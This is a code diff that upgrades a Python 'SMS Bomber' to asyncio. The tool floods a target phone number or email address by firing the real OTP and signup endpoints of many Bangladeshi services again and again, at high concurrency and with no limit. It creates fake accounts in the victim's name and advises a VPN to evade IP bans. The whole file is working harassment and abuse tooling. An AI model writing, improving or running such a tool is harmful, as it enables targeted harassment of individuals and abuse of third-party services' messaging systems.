@@ -1,13 +1,16 @@
-import requests
-import threading
-import time
+import asyncio
+import aiohttp
 import random
 import string
 import os
 import sys
+import logging
 from datetime import datetime
 
-# Colors for terminal (Compatible with a-Shell, Termux, CMD, PowerShell)
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Colors for terminal
 R = '\033[1;31m' # Red
 G = '\033[1;32m' # Green
 Y = '\033[1;33m' # Yellow
@@ -37,14 +40,15 @@ def banner():
     print(f"""
 {C}╔══════════════════════════════════════════════════════════════╗
 ║ {Y}   ____  __  __ ____    ____   ___  __  __ ____  _____ ____  {C}║
-║ {Y}  / ___||  \/  / ___|  | __ ) / _ \|  \/  | __ )| ____|  _ \ {C}║
-║ {Y}  \___ \| |\/| \___ \  |  _ \| | | | |\/| |  _ \|  _| | |_) |{C}║
-║ {Y}   ___) | |  | |___) | | |_) | |_| | |  | | |_) | |___|  _ < {C}║
-║ {Y}  |____/|_|  |_|____/  |____/ \___/|_|  |_|____/|_____|_| \_\{C}║
+║ {Y}  / ___||  \/  / ___|  | __ ) / _ \|  \/  | | __ )| ____|  _ \ {C}║
+║ {Y}  \___ \| |\/| \___ \  |  _ \| | | | |\/| | |  _ \| _| | |_) |{C}║
+║ {Y}   ___) | |  | |___) | | |_) | |_| | |  | | | |_) | |___|  _ < {C}║
+║ {Y}  |____/|_|  |_|____/  |____/ \___/|_|  |_| |____/|_____|_| \_\{C}║
 ║                                                              ║
 ║ {W}      Cross-Platform SMS Bomber (iOS, Android, Windows)      {C}║
 ║ {W}           Created for: a-Shell, Termux, Windows             {C}║
 ║ {G}           Security: Session, Smart Retry, Log, Jitter       {C}║
+║ {P}           Engine: Asyncio & Aiohttp (High Speed)            {C}║
 ╚══════════════════════════════════════════════════════════════╝
     """)
 
@@ -57,25 +61,29 @@ def get_random_email():
 def get_random_phone():
     return "01" + "".join(random.choices(string.digits, k=9))
 
-class Bomber:
-    def __init__(self, target, limit, mode='sms', proxies=None):
+class AsyncBomber:
+    def __init__(self, target, limit, mode='sms', stop_event=None):
         self.target = target
         self.limit = limit # 0 means infinite
         self.mode = mode
-        self.proxies_list = proxies if proxies else []
         self.sent = 0
         self.failed = 0
-        self.proxy_success = 0
-        self.proxy_fail = 0
         self.running = True
-        self.lock = threading.Lock()
-        self.session = requests.Session()
+        self.stop_event = stop_event if stop_event else asyncio.Event()
         self.log_file = f"bombing_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-        
+        self.session = None # aiohttp session will be created later
+
         with open(self.log_file, "w") as f:
             f.write(f"Bombing Session Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write(f"Target: {self.target} | Mode: {self.mode.upper()}\n")
             f.write("-" * 60 + "\n")
+
+    async def __aenter__(self):
+        self.session = aiohttp.ClientSession()
+        return self
+
+    async def __aexit__(self, exc_type, exc_val, exc_tb):
+        await self.session.close()
 
     def get_headers(self, extra=None):
         headers = {"User-Agent": random.choice(USER_AGENTS)}
@@ -83,381 +91,333 @@ class Bomber:
             headers.update(extra)
         return headers
 
-    def get_proxy(self):
-        if not self.proxies_list:
-            return None
-        proxy = random.choice(self.proxies_list)
-        return {"http": proxy, "https": proxy}
+    async def log_event(self, api_name, success, status_code=None):
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        status = "SUCCESS" if success else "FAILED"
+        log_entry = f"[{timestamp}] {api_name:15} | {status:7} | Code: {status_code}\n"
 
-    def log_event(self, api_name, success, status_code=None, used_proxy=False):
-        with self.lock:
-            timestamp = datetime.now().strftime("%H:%M:%S")
-            status = "SUCCESS" if success else "FAILED"
-            proxy_info = " [PROXY]" if used_proxy else ""
-            log_entry = f"[{timestamp}] {api_name:15} | {status:7} | Code: {status_code}{proxy_info}\n"
-            
-            with open(self.log_file, "a") as f:
-                f.write(log_entry)
-            
-            if success:
-                self.sent += 1
-                if used_proxy: self.proxy_success += 1
-                color = G
-                icon = "✓"
-            else:
-                self.failed += 1
-                if used_proxy: self.proxy_fail += 1
-                color = R
-                icon = "✗"
+        with open(self.log_file, "a") as f:
+            f.write(log_entry)
 
-            limit_str = "∞" if self.limit == 0 else str(self.limit)
-            proxy_stat = f" | {B}Proxy: {self.proxy_success}/{self.proxy_fail}{W}" if self.proxies_list else ""
-            
-            # Full logging without clearing terminal
-            print(f"{color}[{icon}] {timestamp} | {api_name:15} | {status:7} | Sent: {self.sent}/{limit_str}{proxy_stat}")
+        if success:
+            self.sent += 1
+            color = G
+            icon = "✓"
+        else:
+            self.failed += 1
+            color = R
+            icon = "✗"
+
+        limit_str = "∞" if self.limit == 0 else str(self.limit)
+        logging.info(f"{color}[{icon}] {timestamp} | {api_name:15} | {status:7} | Sent: {self.sent}/{limit_str}{W}")
 
     # SMS APIs
-    def api_redx(self):
+    async def api_redx(self):
         url = "https://api.redx.com.bd:443/v1/user/signup"
         data = {"name": self.target, "service": "redx", "phoneNumber": self.target}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("RedX", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("RedX", False, "Error", bool(proxy))
+            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("RedX", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("RedX", False, f"Error")
             return False
 
-    def api_khaasfood(self):
+    async def api_khaasfood(self):
         url = f"https://api.khaasfood.com/api/app/one-time-passwords/token?username={self.target}"
-        proxy = self.get_proxy()
         try:
-            res = self.session.get(url, headers=self.get_headers(), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("KhaasFood", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("KhaasFood", False, "Error", bool(proxy))
+            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("KhaasFood", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("KhaasFood", False, f"Error")
             return False
 
-    def api_bioscope(self):
+    async def api_bioscope(self):
         url = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en"
         data = {"number": f"+88{self.target}"}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json", "Origin": "https://www.bioscopeplus.com"}), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("Bioscope", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("Bioscope", False, "Error", bool(proxy))
+            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json", "Origin": "https://www.bioscopeplus.com"}), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("Bioscope", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("Bioscope", False, f"Error")
             return False
 
-    def api_bikroy(self):
+    async def api_bikroy(self):
         url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={self.target}"
-        proxy = self.get_proxy()
         try:
-            res = self.session.get(url, headers=self.get_headers(), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("Bikroy", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("Bikroy", False, "Error", bool(proxy))
+            async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("Bikroy", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("Bikroy", False, f"Error")
             return False
 
-    def api_proiojon(self):
+    async def api_proiojon(self):
         url = "https://billing.proiojon.com/api/v1/auth/sign-up"
         data = {"name": get_random_name(), "phone": self.target, "email": get_random_email(), "password": "password123", "ref_code": ""}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("Proiojon", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("Proiojon", False, "Error", bool(proxy))
+            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("Proiojon", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("Proiojon", False, f"Error")
             return False
 
-    def api_beautybooth(self):
+    async def api_beautybooth(self):
         url = "https://admin.beautybooth.com.bd/api/v2/auth/signup"
         data = {"phone": self.target}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("BeautyBooth", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("BeautyBooth", False, "Error", bool(proxy))
+            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("BeautyBooth", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("BeautyBooth", False, f"Error")
             return False
 
-    def api_robi(self):
+    async def api_robi(self):
         url = "https://webapi.robi.com.bd/v1/account/register/otp"
         data = {"phone_number": self.target}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("Robi", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("Robi", False, "Error", bool(proxy))
+            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("Robi", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("Robi", False, f"Error")
             return False
 
-    def api_arogga(self):
+    async def api_arogga(self):
         url = "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10"
         data = {"mobile": self.target, "fcmToken": "", "referral": ""}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, data=data, headers=self.get_headers(), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("Arogga", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("Arogga", False, "Error", bool(proxy))
+            async with self.session.post(url, data=data, headers=self.get_headers(), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("Arogga", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("Arogga", False, f"Error")
             return False
 
-    def api_mygp(self):
+    async def api_mygp(self):
         url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{self.target}/"
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, headers=self.get_headers(), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("MyGP", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("MyGP", False, "Error", bool(proxy))
+            async with self.session.post(url, headers=self.get_headers(), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("MyGP", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("MyGP", False, f"Error")
             return False
 
-    def api_bdstall(self):
+    async def api_bdstall(self):
         url = "https://www.bdstall.com/userRegistration/save_otp_info/"
         data = {"UserTypeID": "2", "RequestType": "1", "Name": "Md", "Mobile": self.target}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, data=data, headers=self.get_headers(), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("BDStall", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("BDStall", False, "Error", bool(proxy))
+            async with self.session.post(url, data=data, headers=self.get_headers(), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("BDStall", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("BDStall", False, f"Error")
             return False
 
-    def api_shikho(self):
+    async def api_shikho(self):
         url = "https://api.shikho.com/auth/v2/send/sms"
-        data = {"phone": self.target, "type": "student", "auth_type": "signup", "vendor": "shikho"}
-        proxy = self.get_proxy()
+        data = {"phone": self.target, "type": "st"}
         try:
-            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("Shikho", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("Shikho", False, "Error", bool(proxy))
+            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("Shikho", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("Shikho", False, f"Error")
             return False
 
     # Email APIs
-    def api_bikroy_email(self):
+    async def api_bikroy_email(self):
         url = "https://bikroy.com/data/account"
         data = {"account":{"profile":{"name":get_random_name(),"opt_out":False},"login":{"email":self.target,"password":"Password123"}}}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("BikroyEmail", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("BikroyEmail", False, "Error", bool(proxy))
+            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("BikroyEmail", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("BikroyEmail", False, f"Error")
             return False
 
-    def api_busbud_email(self):
+    async def api_busbud_email(self):
         url = "https://www.busbud.com/auth/email-signup"
         data = {"first_name":"Md","last_name":"User","email":self.target,"password":"Password123","confirmed_password":"Password123","email_opt_in":False,"locale":"en"}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("BusbudEmail", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("BusbudEmail", False, "Error", bool(proxy))
+            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("BusbudEmail", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("BusbudEmail", False, f"Error")
             return False
 
-    def api_saralifestyle_email(self):
+    async def api_saralifestyle_email(self):
         url = "https://prod.saralifestyle.com/api/Master/SendTokenV1"
         data = {"userContactNo":self.target,"userType":"customer","actionFor":"r"}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("SaraEmail", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("SaraEmail", False, "Error", bool(proxy))
+            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("SaraEmail", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("SaraEmail", False, f"Error")
             return False
 
-    def api_tohfay_email(self):
+    async def api_tohfay_email(self):
         url = "https://www.tohfay.com/user/register.html"
         data = {"first_name": get_random_name(), "last_name": get_random_name(), "gender": "1", "email": self.target, "password": "Password123"}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, data=data, headers=self.get_headers(), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("TohfayEmail", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("TohfayEmail", False, "Error", bool(proxy))
+            async with self.session.post(url, data=data, headers=self.get_headers(), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("TohfayEmail", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("TohfayEmail", False, f"Error")
             return False
 
-    def api_robishop_email(self):
+    async def api_robishop_email(self):
         url = "https://api.robishop.com.bd/api/user/create"
         data = {"customer":{"email":self.target,"firstname":get_random_name(),"lastname":get_random_name(),"custom_attributes":{"mobilenumber":get_random_phone()}},"password":"Password123"}
-        proxy = self.get_proxy()
         try:
-            res = self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), proxies=proxy, timeout=10)
-            success = res.status_code == 200
-            self.log_event("RobishopEmail", success, res.status_code, bool(proxy))
-            return success
-        except:
-            self.log_event("RobishopEmail", False, "Error", bool(proxy))
+            async with self.session.post(url, json=data, headers=self.get_headers({"Content-Type": "application/json"}), timeout=10) as res:
+                success = res.status == 200
+                await self.log_event("RobishopEmail", success, res.status)
+                return success
+        except Exception as e:
+            await self.log_event("RobishopEmail", False, f"Error")
             return False
 
-    def bomb(self):
+    async def bomb_task(self):
         if self.mode == 'sms':
             apis = [
-                self.api_redx, self.api_khaasfood, self.api_bioscope, 
+                self.api_redx, self.api_khaasfood, self.api_bioscope,
                 self.api_bikroy, self.api_proiojon, self.api_beautybooth,
-                self.api_robi, self.api_arogga, self.api_mygp, 
+                self.api_robi, self.api_arogga, self.api_mygp,
                 self.api_bdstall, self.api_shikho
             ]
         else:
             apis = [
-                self.api_bikroy_email, self.api_busbud_email, 
+                self.api_bikroy_email, self.api_busbud_email,
                 self.api_saralifestyle_email, self.api_tohfay_email,
                 self.api_robishop_email
             ]
-        
-        while self.running:
+
+        while self.running and not self.stop_event.is_set():
             if self.limit != 0 and self.sent >= self.limit:
                 self.running = False
                 break
-                
+
             api = random.choice(apis)
-            api()
-            
+            await api()
+
             # Jitter: Random delay to mimic human behavior
-            time.sleep(random.uniform(0.1, 0.5))
+            await asyncio.sleep(random.uniform(0.1, 0.5))
 
-def scrape_proxies():
-    print(f"{Y}[*] Scraping free proxies for stealth...")
-    proxies = []
-    sources = [
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
-        "https://www.proxy-list.download/api/v1/get?type=http",
-        "https://www.proxyscan.io/download?type=http"
-    ]
-    for url in sources:
-        try:
-            res = requests.get(url, timeout=10)
-            if res.status_code == 200:
-                found = res.text.strip().split('\n')
-                proxies.extend([p.strip() for p in found if p.strip()])
-        except:
-            continue
-    
-    proxies = list(set(proxies))
-    if proxies:
-        print(f"{G}[✓] Found {len(proxies)} unique proxies!")
-    else:
-        print(f"{R}[!] Failed to scrape proxies. Continuing without them.")
-    return proxies
-
-def main():
+async def main():
     while True:
         clear()
         banner()
-        
+
+        print(f"{Y}[!] For optimal performance and to avoid IP bans, it is highly recommended to use a VPN service.")
+        print(f"{Y}[!] Please connect your VPN to a stable location before starting.\n{W}")
+
         try:
             print(f"{C}[1] SMS Bombing")
             print(f"{C}[2] Email Bombing")
             print(f"{C}[E] Exit Project")
             choice = input(f"\n{Y}[?] Select Mode: {W}").lower()
-            
+
             if choice == 'e':
-                print(f"{G}[✓] Thank you for using SMS Bomber!")
+                logging.info(f"{G}[✓] Thank you for using SMS Bomber!{W}")
                 break
-                
+
             if choice == '1':
                 mode = 'sms'
                 target = input(f"{C}[?] Enter Target Number (e.g. 017xxxxxxxx): {W}")
                 if len(target) != 11 or not target.isdigit():
-                    print(f"{R}[!] Invalid Number Format!")
-                    time.sleep(2)
+                    logging.error(f"{R}[!] Invalid Number Format!{W}")
+                    await asyncio.sleep(2)
                     continue
             elif choice == '2':
                 mode = 'email'
                 target = input(f"{C}[?] Enter Target Email: {W}")
                 if "@" not in target:
-                    print(f"{R}[!] Invalid Email Format!")
-                    time.sleep(2)
+                    logging.error(f"{R}[!] Invalid Email Format!{W}")
+                    await asyncio.sleep(2)
                     continue
             else:
-                print(f"{R}[!] Invalid Choice!")
-                time.sleep(2)
+                logging.error(f"{R}[!] Invalid Choice!{W}")
+                await asyncio.sleep(2)
                 continue
-                
+
             limit_input = input(f"{C}[?] Enter Bombing Limit (0 for Unlimited): {W}")
             limit = int(limit_input) if limit_input.isdigit() else 0
-            
-            threads_input = input(f"{C}[?] Enter Thread Count (Max 150): {W}")
-            threads_count = min(int(threads_input), 150) if threads_input.isdigit() else 10
-            
-            print(f"\n{C}[1] Use Custom Proxy")
-            print(f"{C}[2] Auto-Scrape Free Proxies (Stealth)")
-            print(f"{C}[3] No Proxy")
-            proxy_choice = input(f"\n{Y}[?] Select Proxy Mode: {W}")
-            
-            proxies = []
-            if proxy_choice == '1':
-                p = input(f"{C}[?] Enter Proxy (e.g. http://user:pass@ip:port): {W}")
-                proxies = [p]
-            elif proxy_choice == '2':
-                proxies = scrape_proxies()
-            
-            print(f"\n{Y}[*] Starting {mode.upper()} Bombing on {target}...")
-            print(f"{Y}[*] Press Enter to stop and return to menu.\n")
-            
-            bomber = Bomber(target, limit, mode, proxies)
-            
-            threads = []
-            for _ in range(threads_count):
-                t = threading.Thread(target=bomber.bomb)
-                t.daemon = True
-                t.start()
-                threads.append(t)
+
+            tasks_count_input = input(f"{C}[?] Enter Concurrency Level (e.g. 50): {W}")
+            tasks_count = int(tasks_count_input) if tasks_count_input.isdigit() else 50
+
+            logging.info(f"\n{Y}[*] Starting {mode.upper()} Bombing on {target} with {tasks_count} concurrent tasks...{W}")
+            logging.info(f"{Y}[*] Press Enter to stop and return to menu.\n{W}")
+
+            stop_event = asyncio.Event()
+            async with AsyncBomber(target, limit, mode, stop_event) as bomber:
+                bombing_tasks = [asyncio.create_task(bomber.bomb_task()) for _ in range(tasks_count)]
+
+                # Task to wait for user input to stop the bombing
+                input_task = asyncio.create_task(asyncio.to_thread(input, ""))
                 
-            # Wait for Enter key to stop
+                # Wait for either all bombing tasks to complete (if limit is set) or user input to stop
+                done, pending = await asyncio.wait(bombing_tasks + [input_task], return_when=asyncio.FIRST_COMPLETED)
+
+                # Signal stop
+                bomber.running = False
+                stop_event.set()
+
+                # Cancel any remaining pending bombing tasks
+                for task in pending:
+                    task.cancel()
+                await asyncio.gather(*pending, return_exceptions=True)
+
+                # Clean up input task
+                if not input_task.done():
+                    input_task.cancel()
+                try:
+                    await input_task
+                except asyncio.CancelledError:
+                    pass
+
+            logging.info(f"\n\n{G}[✓] Bombing Stopped!{W}")
+            logging.info(f"{G}[+] Total Sent: {bomber.sent}{W}")
+            logging.info(f"{R}[-] Total Failed: {bomber.failed}{W}")
+            logging.info(f"{Y}[*] Detailed log saved to: {bomber.log_file}{W}")
+            print(f"\n{C}Press Enter to return to main menu...{W}")
             input()
-            bomber.running = False
-            
-            print(f"\n\n{G}[✓] Bombing Stopped!")
-            print(f"{G}[+] Total Sent: {bomber.sent}")
-            print(f"{R}[-] Total Failed: {bomber.failed}")
-            print(f"{Y}[*] Detailed log saved to: {bomber.log_file}")
-            print(f"\n{C}Press Enter to return to main menu...")
-            input()
-            
+
         except KeyboardInterrupt:
-            print(f"\n\n{R}[!] Use 'Enter' to stop bombing. Press 'Enter' again to exit project.")
+            logging.info(f"\n\n{R}[!] Use 'Enter' to stop bombing. Press 'Enter' again to exit project.{W}")
             try:
                 input()
                 break
             except:
                 break
         except Exception as e:
-            print(f"\n{R}[!] Error: {e}")
-            time.sleep(3)
+            logging.error(f"\n{R}[!] Error: {e}{W}")
+            await asyncio.sleep(3)
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
